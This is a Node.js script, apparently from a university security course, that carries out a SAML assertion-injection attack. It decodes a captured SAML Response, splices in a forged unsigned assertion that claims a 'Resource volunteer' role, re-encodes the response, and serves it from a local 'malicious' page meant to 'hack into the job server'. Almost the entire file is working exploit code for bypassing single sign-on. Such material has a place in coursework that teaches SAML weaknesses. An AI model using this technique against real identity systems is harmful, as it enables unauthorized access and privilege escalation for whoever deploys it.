/**
* Takes a SAML Response and manipulates it to grant access
*/

var http = require('http');
var saml = require('./saml_functions');
var XMLWriter = require('xml-writer');
var fs = require('fs');


/**** WEB SERVER FUNCTIONS AND VARS ****/

var malicious_root_url = 'http://localhost:8891';
var MALICIOUS_PORT = 8891;

const JOB_PORT = 8889;
const IDP_PORT = 8890;
const JOB_SERVER_URL = "http://bmr-cs339.rhcloud.com";
const IDP_URL = "http://idp-cs339.rhcloud.com";

var job_root_url = '';
var idp_root_url = '';

var local = true;

if(local){
    job_root_url = "http://localhost:" + JOB_PORT;
    idp_root_url = "http://localhost:" + IDP_PORT;
}
else {
    job_root_url = JOB_SERVER_URL;
    idp_root_url = IDP_URL;
}



var maliciousResponse = '';


/**
*  Handle incoming request
*/
function request_handler(request,response) {
	if (request.method == 'GET') {
		var htmlFile = 'malicious_user_page.html';
		var text = fs.readFileSync(htmlFile,'utf8');
        text = text.replace('Put job url here',job_root_url);
        text = text.replace('Put SAML Response here',maliciousResponse);
        text = text.replace('Put RelayState here','relay state');
		
        response.writeHead(200, {
            'Content-Type' : 'text/html',
            'Content-Length' : text.length,
            'Access-Control-Allow-Origin' : '*'
        });
        response.end(text);
	}
}


/**
* Takes a base64 encoded SAML Response and alters it to get access
*/
function alter_response(samlResponseBase64) {
	var samlResponse = new Buffer(samlResponseBase64,'base64').toString('utf8');

    var datetime = new Date().getTime();

    var writer = new XMLWriter(true);

	//Start saml:Assertion element and write attributes
	writer.startElement('saml:Assertion');
	writer.writeAttribute('xmlns:saml', 'urn:oasis:names:tc:SAML:2.0:assertion');
	writer.writeAttribute('IssueInstant',datetime);
	writer.writeAttribute('Version','2.0');

	//Issuer
	writer.startElement('saml:Issuer');
    writer.text(idp_root_url);
    writer.endElement();

    //put signature here

    //Subject, NameID
    writer.startElement('saml:Subject');
    writer.writeElement('saml:NameID','A legit user');
    writer.endElement();

    //Conditions, Audience Restriction, and Audience
    writer.startElement('saml:Conditions');
    var assertionExpire = datetime + 100000000;
    writer.writeAttribute('NotOnOrAfter',assertionExpire.toString());

    //saml:AudienceRestriction element
    writer.startElement('saml:AudienceRestriction');
    writer.startElement('saml:Audience');
    writer.text('Service for which user is authorized');
    writer.endElement();
    writer.endElement();
    
    //End conditions element
    writer.endElement();
    
    //AttributeStatement, Attribute, and AttributeValue
    //Identifies the user as a resource volunteer
    writer.startElement('saml:AttributeStatement');
    writer.startElement('saml:Attribute');
    writer.startElement('saml:AttributeValue');

    //Always identify as a resource volunteer
    writer.text('Resource volunteer');
    writer.endElement();
    writer.endElement();
    writer.endElement();

    //End Assertion
    writer.endElement();

    //Get Assertion in a string
    var maliciousAssertion = writer.toString();

    //Paste it into the SAML Response
    var startIndex = samlResponse.indexOf('</saml:Issuer>') + ('</saml:Issuer>'.length);
    var firstHalf = samlResponse.substring(0,startIndex);
    var secondHalf = samlResponse.substring(startIndex);
    var newResponse = firstHalf + maliciousAssertion + secondHalf;

    //Encode
	var newResponseBase64 = new Buffer(newResponse).toString('base64');
	return newResponseBase64
}

function main() {
    var origSamlResponseBase64 = process.argv[2];
	maliciousResponse = alter_response(origSamlResponseBase64);

	var server = http.createServer(request_handler);
	server.listen(MALICIOUS_PORT, function() {
		console.log('Navigate to ' + malicious_root_url + ' to hack into the job server');
	});
}
main();






